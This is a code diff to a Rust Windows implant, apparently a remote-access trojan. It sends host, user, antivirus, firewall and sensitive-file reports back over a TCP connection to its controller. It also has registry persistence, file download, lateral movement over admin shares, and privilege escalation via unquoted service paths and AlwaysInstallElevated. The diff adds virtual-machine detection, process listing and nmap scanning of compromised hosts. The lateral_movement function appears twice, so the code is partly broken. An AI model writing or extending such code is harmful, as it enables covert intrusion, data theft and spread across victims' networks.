@@ -1,3 +1,4 @@
+use std::os::windows::process::CommandExt;
 use std::process::Command;
 use sysinfo::System;
 use tokio::{net::TcpStream, process};
@@ -55,24 +56,22 @@ fn get_user_groups(user: &str) -> Vec<String> {
         .map(|s| s.to_string())
         .collect()
 }
+
 async fn generate_security_report(conn: &mut TcpStream) -> Result<(), ()> {
     let mut report = String::new();
 
-    
     println!("Gathering OS information...");
     let os_info = os_info::get();
     report.push_str(&format!("Operating System: {}\n", os_info.os_type()));
     report.push_str(&format!("OS Version: {}\n", os_info.version()));
     report.push_str(&format!("OS Architecture: {}\n", os_info.bitness()));
 
-    
     println!("Gathering user information...");
     let user = whoami::username();
     let groups = get_user_groups(&user);
     report.push_str(&format!("Current User: {}\n", user));
     report.push_str(&format!("User Groups: {:?}\n", groups));
 
-    
     println!("Gathering network information...");
     let network_info = network_connections();
     report.push_str(&format!(
@@ -80,22 +79,18 @@ async fn generate_security_report(conn: &mut TcpStream) -> Result<(), ()> {
         String::from_utf8_lossy(&network_info)
     ));
 
-    
     println!("Checking firewall status...");
     let firewall_status = check_firewall_status().await;
     report.push_str(&format!("Firewall Status: {}\n", firewall_status));
 
-    
     println!("Checking antivirus status...");
     let antivirus_status = check_antivirus_status().await;
     report.push_str(&format!("Antivirus Status: {}\n", antivirus_status));
 
-    
     println!("Checking patch level...");
     let patch_level = check_patch_level().await;
     report.push_str(&format!("System Patch Level: {}\n", patch_level));
 
-    
     println!("Checking sensitive files...");
     let sensitive_files = check_sensitive_files().await;
     report.push_str(&format!(
@@ -103,7 +98,13 @@ async fn generate_security_report(conn: &mut TcpStream) -> Result<(), ()> {
         sensitive_files
     ));
 
-    
+    println!("Checking virtualization status...");
+    let virtualization_status = check_virtualization_status().await;
+    report.push_str(&format!(
+        "Virtualization Status: {}\n",
+        virtualization_status
+    ));
+
     println!("Sending report to the server...");
     write(conn, report.as_bytes().to_vec()).await.unwrap();
 
@@ -122,6 +123,7 @@ async fn check_firewall_status() -> String {
 
     String::from_utf8_lossy(&output.stdout).to_string()
 }
+
 async fn check_antivirus_status() -> String {
     let output = process::Command::new("powershell")
         .arg("-Command")
@@ -131,6 +133,7 @@ async fn check_antivirus_status() -> String {
         .expect("Failed to execute powershell command");
     String::from_utf8_lossy(&output.stdout).to_string()
 }
+
 async fn check_patch_level() -> String {
     let output = process::Command::new("powershell")
         .arg("-Command")
@@ -140,15 +143,6 @@ async fn check_patch_level() -> String {
         .expect("Failed to execute powershell command");
     String::from_utf8_lossy(&output.stdout).to_string()
 }
-
-
-
-
-
-
-
-
-
 
 async fn check_sensitive_files() -> String {
     let output = process::Command::new("powershell")
@@ -164,6 +158,26 @@ async fn check_sensitive_files() -> String {
             }
             $results | ForEach-Object { $_.FullName }
         "#)
+        .output()
+        .await
+        .expect("Failed to execute powershell command");
+
+    String::from_utf8_lossy(&output.stdout).to_string()
+}
+
+async fn check_virtualization_status() -> String {
+    let output = process::Command::new("powershell")
+        .arg("-Command")
+        .arg(
+            r#"
+            $vm = Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Model
+            if ($vm -match "VirtualBox|VMware|KVM|Hyper-V") {
+                "Virtualized"
+            } else {
+                "Not virtualized"
+            }
+        "#,
+        )
         .output()
         .await
         .expect("Failed to execute powershell command");
@@ -218,6 +232,8 @@ System Information:
   Network Connections: {}
   Startup Services: {}
   Startup Reg Keys: {}
+  Disk Usage: {}
+  Running Processes: {}
 "#,
         hostname::get().unwrap().to_string_lossy(),
         whoami::username(),
@@ -231,9 +247,40 @@ System Information:
         String::from_utf8_lossy(&network_connections()),
         String::from_utf8_lossy(&startup_services()),
         String::from_utf8_lossy(&startup_reg_keys()),
+        get_disk_usage(),
+        get_running_processes(),
     );
 
     write(conn, info.as_bytes().to_vec()).await.unwrap();
+}
+
+fn get_disk_usage() -> String {
+    let disks = sysinfo::Disks::new_with_refreshed_list();
+    let mut disk_info = String::new();
+    for disk in disks.list() {
+        disk_info.push_str(&format!(
+            "Disk: {:?} - Total: {} GB, Available: {} GB\n",
+            disk.name(),
+            disk.total_space() / 1_073_741_824,
+            disk.available_space() / 1_073_741_824
+        ));
+    }
+    disk_info
+}
+
+fn get_running_processes() -> String {
+    let mut sys = System::new_all();
+    sys.refresh_processes();
+    let mut process_info = String::new();
+    for (pid, process) in sys.processes() {
+        process_info.push_str(&format!(
+            "PID: {} - Name: {} - CPU Usage: {}%\n",
+            pid,
+            process.name(),
+            process.cpu_usage()
+        ));
+    }
+    process_info
 }
 
 fn network_connections() -> Vec<u8> {
@@ -293,9 +340,7 @@ async fn persist(cmd: &Vec<u8>, conn: &mut TcpStream) -> Result<(), ()> {
             run_cmd(reg_str).await;
             write(conn, b"[+] Persistence done".to_vec()).await.unwrap();
         }
-        None => {
-            
-        }
+        None => {}
     }
     Ok(())
 }
@@ -330,13 +375,11 @@ async fn download(cmd: &Vec<u8>, mut conn: &mut TcpStream) {
                     .unwrap();
             }
         },
-        None => {
-            
-        }
+        None => {}
     }
 }
+
 async fn attempt_lateral_movement(target: &str) -> bool {
-    
     let output = process::Command::new("net")
         .arg("use")
         .arg(format!("\\\\{}\\C$", target))
@@ -378,9 +421,7 @@ async fn attempt_weak_service_path() -> bool {
                     if path_parts.len() >= 2 {
                         let path = path_parts[1].trim();
                         if path.contains(" ") && !path.contains("\"") {
-                            
                             if std::path::Path::new(path).exists() {
-                                
                                 return true;
                             }
                         }
@@ -406,45 +447,97 @@ async fn attempt_always_install_elevated() -> bool {
     let output = String::from_utf8(output.stdout).unwrap();
     output.contains("0x1")
 }
+
 pub async fn lateral_movement(conn: &mut TcpStream) -> Result<(), ()> {
     let targets = scan_network().await;
+    let mut report = String::new();
 
     if targets.is_empty() {
-        write(conn, b"No lateral movement targets found".to_vec())
-            .await
-            .unwrap();
+        report.push_str("No lateral movement targets found\n");
     } else {
-        write(
-            conn,
-            format!("Lateral movement targets: {:?}", targets)
-                .as_bytes()
-                .to_vec(),
-        )
-        .await
-        .unwrap();
+        report.push_str(&format!("Lateral movement targets: {:?}\n", targets));
 
-        let mut success = false;
         for target in targets {
             if attempt_lateral_movement(&target).await {
-                write(
-                    conn,
-                    format!("Lateral movement successful on target: {}", target)
-                        .as_bytes()
-                        .to_vec(),
-                )
-                .await
-                .unwrap();
-                success = true;
+                report.push_str(&format!(
+                    "Lateral movement successful on target: {}\n",
+                    target
+                ));
+                let target_info = get_target_info(&target).await;
+                report.push_str(&format!("Target Info: {}\n", target_info));
+            } else {
+                report.push_str(&format!("Lateral movement failed on target: {}\n", target));
             }
-        }
-
-        if !success {
-            write(conn, b"Lateral movement failed on all targets".to_vec())
-                .await
-                .unwrap();
         }
     }
 
+    write(conn, report.as_bytes().to_vec()).await.unwrap();
+    Ok(())
+}
+
+async fn get_target_info(target: &str) -> String {
+    let mut info = String::new();
+    info.push_str(&format!("Target: {}\n", target));
+
+    // Perform an nmap scan to gather information about open ports and services
+    let output = process::Command::new("nmap")
+        .arg("-A")
+        .arg(target)
+        .output()
+        .await
+        .expect("Failed to execute nmap command");
+
+    info.push_str("Nmap Scan Results:\n");
+    info.push_str(&String::from_utf8_lossy(&output.stdout));
+
+    // Perform a ping to check if the target is reachable
+    let output = process::Command::new("ping")
+        .arg("-c 4")
+        .arg(target)
+        .output()
+        .await
+        .expect("Failed to execute ping command");
+
+    info.push_str("\nPing Results:\n");
+    info.push_str(&String::from_utf8_lossy(&output.stdout));
+
+    // Perform a traceroute to the target
+    let output = process::Command::new("traceroute")
+        .arg(target)
+        .output()
+        .await
+        .expect("Failed to execute traceroute command");
+
+    info.push_str("\nTraceroute Results:\n");
+    info.push_str(&String::from_utf8_lossy(&output.stdout));
+
+    info
+}
+
+pub async fn lateral_movement(conn: &mut TcpStream) -> Result<(), ()> {
+    let targets = scan_network().await;
+    let mut report = String::new();
+
+    if targets.is_empty() {
+        report.push_str("No lateral movement targets found\n");
+    } else {
+        report.push_str(&format!("Lateral movement targets: {:?}\n", targets));
+
+        for target in targets {
+            if attempt_lateral_movement(&target).await {
+                report.push_str(&format!(
+                    "Lateral movement successful on target: {}\n",
+                    target
+                ));
+                let target_info = get_target_info(&target).await;
+                report.push_str(&format!("Target Info: {}\n", target_info));
+            } else {
+                report.push_str(&format!("Lateral movement failed on target: {}\n", target));
+            }
+        }
+    }
+
+    write(conn, report.as_bytes().to_vec()).await.unwrap();
     Ok(())
 }
 
@@ -472,35 +565,29 @@ async fn scan_network() -> Vec<String> {
 
 pub async fn privilege_escalation(conn: &mut TcpStream) -> Result<(), ()> {
     let mut success = false;
+    let mut report = String::new();
 
     if attempt_weak_service_path().await {
-        write(
-            conn,
-            b"Privilege escalation successful using weak service path".to_vec(),
-        )
-        .await
-        .unwrap();
+        report.push_str("Privilege escalation successful using weak service path\n");
         success = true;
+    } else {
+        report.push_str("Privilege escalation using weak service path failed\n");
     }
 
     if attempt_always_install_elevated().await {
-        write(
-            conn,
-            b"Privilege escalation successful using AlwaysInstallElevated".to_vec(),
-        )
-        .await
-        .unwrap();
+        report.push_str("Privilege escalation successful using AlwaysInstallElevated\n");
         success = true;
+    } else {
+        report.push_str("Privilege escalation using AlwaysInstallElevated failed\n");
     }
 
     if success {
         spawn_elevated_process(conn).await;
     } else {
-        write(conn, b"Privilege escalation failed".to_vec())
-            .await
-            .unwrap();
+        report.push_str("Privilege escalation failed\n");
     }
 
+    write(conn, report.as_bytes().to_vec()).await.unwrap();
     Ok(())
 }
 
@@ -517,6 +604,7 @@ pub async fn run_cmd(command: String) -> Vec<u8> {
     println!("{}", String::from_utf8(output.stdout.clone()).unwrap());
     output.stdout
 }
+
 pub async fn run_ps(command: String) -> Vec<u8> {
     let mut output = process::Command::new(e!("powershell.exe"));
     output.creation_flags(0x8000000);
@@ -532,7 +620,6 @@ pub async fn run_ps(command: String) -> Vec<u8> {
 }
 
 async fn spawn_elevated_process(conn: &mut TcpStream) {
-    
     let addr = crate::e!("127.0.0.1:8085");
     let output = process::Command::new("cmd")
         .args(&["/C", &format!("start \"\" \"{}\"", addr)])
